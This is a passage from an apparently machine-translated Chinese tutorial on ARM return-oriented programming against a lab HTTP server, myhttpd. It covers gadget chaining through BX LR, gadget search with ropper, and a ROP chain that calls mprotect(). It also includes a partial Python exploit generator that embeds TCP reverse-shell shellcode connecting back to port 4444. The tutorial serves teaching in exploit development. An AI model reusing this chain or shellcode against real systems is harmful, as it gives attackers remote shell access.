  * R0:线程堆栈的地址。*addr必须与系统页面大小（通常为4096字节）对齐。您希望R0小于将加载外壳代码的地址。
  * R1:一些值，以确保我们的堆栈可以执行。
  * R2:0x7
上一个ROP
gadget的链式指令将指向libc中mprotect（）的地址。mprotect（）将返回，下一步将执行shellcode。我想现在是讨论链式指令的好时机。。。
### 链接指令-处理BX LR
在本系列的第二部分中，当我解释了ROP的一般思想时，我已经准备好丢弃两个具有不同链接指令的gadget：POP{…，PC}和BLX
R4。然后我们讨论了叶函数和非叶函数，比较了它们的结论，发现在叶函数中使用BX
LR返回调用方。当然，这些指令也用作gadget的链接指令。既然我们不能太挑剔gadget，我们就得用我们得到的gadgets。
我认为在这一点上，我们应该很好地连锁gadget（如果没有看到上一篇文章的话）如POP{…，PC}。但是我们如何处理BX-LR？一种方法是在使用gadget（使用BX-LR作为链接指令）之前，每次使用下一个gadgets地址准备LR寄存器。这当然是可能的，但在空间方面成本相当高，而且效果不太好。一种更优雅的方法是将LR指向一个gadget，该gadget执行类似POP{PC}的操作，这样我们就可以使用BX
LR gadget，只需将下一个gadget的地址推送到堆栈上。一个简单的例子：
执行流程：
    LR: 0xaaaaaaaa
        +-------+ 0xaaaaaaaa : pop {pc}      0xcccccccc : mov r2, r1, pop {r11, pc}
执行时堆栈布局：
    SP
                  +  0xa...     0xc...
                  | +--->   +---------->
                  v
    +---------------------+-------+------------------------------+
    |             |   0x  | JUNK  | value|                       |
    |             |   cc  | value | for  |                       |
    |             |   cc  | for   | PC   |                       |
    |             |   cc  | R11   |      |                       |
    |             |   cc  |       |      |                       |
    +-------------+-------+-------+------+-----------------------+
    0x0
我们希望首先在0xbbbbb执行gadget，然后在0xcccccccc执行gadget。LR指向位于0xaaaaaaaa的gadget。当gadget使用BX-LR作为链接指令时，BX-LR将跳转到0xaaaaaaaa，将SP处的值弹出到PC中，然后继续执行。在我们的例子中，我们准备ROP链的方式是0xaaaaaaaa将地址0xcccccccc弹出到PC中。每次我们现在使用BX
LR 的gadget时，我们可以将下面的gadget地址推送到堆栈上，从而以更方便的方式链接它们。
有时有链式指令在任何组合中使用BL，比如BLX
R7。当我们无法避免使用这样一个gadget时，我们必须恢复LR中的值以再次指向0xaaaaaaaa，因为BL指令将用PC+4更新LR。
### 使用 ropper
我们如何找到gadget？您可以使用objdump手动分解和反汇编它们。。。但那是一种痛苦。让我介绍一下ropper：
[ropper](https://github.com/sashs/Ropper "ropper")可以很容易地安装在python
virtualenv中。检查GitHub以获取说明。
我将让以下解释最重要的特征：
    dimi@dimi-lab ~ % cd arm-rop                                                                              │0x0000220e (0x0000220f): pop {r0, r3, r4, r6, r7, pc};                                                    
    dimi@dimi-lab ~/arm-rop % source ~/bin/ropper/bin/activate                                                │0x00035594 (0x00035595): pop {r0, r4, pc};                                                                
    (ropper) dimi@dimi-lab ~/arm-rop % ropper --file libc-2.28.so --console                                   │0x000277e4 (0x000277e5): pop {r0, r4, r5, r6, r7, pc};                                                    
    [INFO] Load gadgets from cache                                                                            │0x000021e0 (0x000021e1): pop {r0, r4, r5, r7, pc};                                                        
    [LOAD] loading... 100%                                                                                    │0x000038fc (0x000038fd): pop {r0, r5, pc};                                                                
    [LOAD] removing double gadgets... 100%                                                                    │0x0005d738 (0x0005d739): pop {r1, r2, r3, r7, pc};                                                        
    (libc-2.28.so/ELF/ARM)>
参数/1/指定找到的gadget的质量，它基本上代表每个gadget的指令数。/1/将找到gadgets，其中第一条指令与seach参数匹配，第二条是链接opcde。/2/因此将找到额外的gadget，它们在链接一条指令之前有第二条指令。你也可以使用这些指令，只要它们不干扰你的ROP链。。。
Ropper显示在搜索的二进制文件中找到的指令的偏移量。在本文的第一部分中，我们已经了解了库在内存中的位置。为了在libc中使用这些gadget，我们将把offset
roppers显示给基址，我们已经发现了。
您已经知道ARM指令是32位长的，而Thumb指令只有16位。我们可以使用这个事实，通过将32位ARM指令一分为二，将它们解释为16位拇指指令。如果我们设置arch
ARMTHUMB，Ropper会自动执行此操作。注意：正如您在上面的asciinima中看到的，如果我们将ARMTHUMB设置为架构，ropper将显示两列偏移（红色和绿色）。绿色的是您要选择作为偏移的那个。您将注意到绿色地址的LSB为1，因此当执行gadget时，内核将自动跳转到thumb模式。
## ROP ROP ROP
下一步是构建ROP链，它
  1. 设置R0、R1和R2，以便在调用mprotect（）后重新映射威胁的堆栈区域（rwx）
  2. 调用mprotect（）
  3. 跳到堆栈上的外壳代码
目前我不认为这将有助于解释ROP链。如果你想要解释，请联系我，我会加上一个。在此之前，我希望嵌入的评论和下面的要点足够了。
  * 我的ROP链注释符号：
  * (7): new (7th) gadget
  * (7 p1): parameter 1 to gadget (7)
  * ergo: "(15 p1): (16) mov r0, #56" means that parameter 1 of gadget 15 is the address of gadget (16).
  * 准备 mprotect() 调用
  * 如何准备R0：将SP+4加载到R0（11）中，通过计算R0&&R1将值与4096（我的系统上的页面大小）（14）对齐（SP的0xFFFFF001-LSB始终为0）。R1被gadget初始化（9p2）。
  * 如何准备R1：加载0x01010101（15 p1）
  * 如何准备R2：将0xffffffffffff-0x29加载到R6（3 p4）中，添加0x31（=0x7）（4）。然后将R6移到R2（6）
  * mprotect() 被调用在 (15 p2)
  * 当mprotect（）返回时，它将执行我们准备好的BX LR slide，它将执行POP{PC}，并从堆栈加载最后一个gadget的地址。然后执行最后一个gadget（16）：BLX SP。因为SP现在指向直接附加到ROP链的shellcode，所以我们将执行shellcode。
  * 我使用的shellcode来自[Azerias关于ARM shellcode的伟大教程](https://azeria-labs.com/tcp-reverse-shell-in-assembly-arm-32-bit/ "Azerias关于ARM外壳代码的伟大教程")-在本例中是TCP反向shellcode，它连接回4444端口。我将connectback IP更改为192.168.250.1。这意味着被利用的myhttpd进程将连接回主机系统上的netcat侦听器。
其他gadget，这是我的ROP链的一部分（见下面的脚本）用于设置BX LR，恢复它，准备值，等等。。。
ROP链嵌入在我的overflowgen.py脚本中（见下文），这将使ROP链的开发更加容易。花点时间理解脚本及其特性，比如--human和——httpencode。你可以在下一节读到关于我使用--human。
前几个变量（shift、shellcode、fmt、base）取决于您的环境。在本文中，我们找到了base、shift（offset）的值。检查它们，确保您了解它们的工作以及我们在本教程中是如何找到它们的。
您可以在下面的脚本中找到我用来利用myhttpd作为溢出变量的ROP链。
    import struct
    import sys
    import argparse
    from urllib.parse import quote_from_bytes
    parser = argparse.ArgumentParser()
    parser.add_argument('--human', help='print overflow string human readable', action='store_true', default=False)
    parser.add_argument('--httpencode', help='HTTP encode overflow data (not pre_out() and post_out() data', action='store_true', default=False)
    args = parser.parse_args()
    # <I little endian unsigned integer
    # adjust to your CPU arch
    global fmt
    fmt='<I'
    # base address in the process memory of the library you want to use for your ROP chain
    base=0xb6e5a000
    # how many bytes should we shift? memory: [shift*"A"+data()+lib(),...]
    shift=144
    shifter = [bytes(shift*'A','ascii'),'shifter']
    shellcode = b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\x20\x01\x21\x92\x1a\xc8\x27\x51\x37\x01\xdf\x04\x1c\x0a\xa1\x4a\x70\x10\x22\x02\x37\x01\xdf\x3f\x27\x20\x1c\x49\x1a\x01\xdf\x20\x1c\x01\x21\x01\xdf\x20\x1c\x02\x21\x01\xdf\x04\xa0\x52\x40\x49\x40\xc2\x71\x0b\x27\x01\xdf\x02\xff\x11\x5c\xc0\xa8\xfa\x01\x2f\x62\x69\x6e\x2f\x73\x68\x58'
    def pre_out():
        print("GET ", end='')
    def post_out():
        print(" HTTP/1.1\r\n\r\n\r\n", end='')
    def data(data, cmt=''):
        return [struct.pack(fmt,data),cmt]
    def lib(offset, cmt=''):
        return [struct.pack(fmt,base+offset),cmt]
    def out(data):
        data = [d[0] for d in data]
        b = bytearray(b''.join(data))
        pre_out()
        sys.stdout.flush()
        if shellcode != '':
            for x in shellcode:
                b.append(x)
        if args.httpencode:
            b = quote_from_bytes(b)
            print(b, end='')
        if not args.httpencode: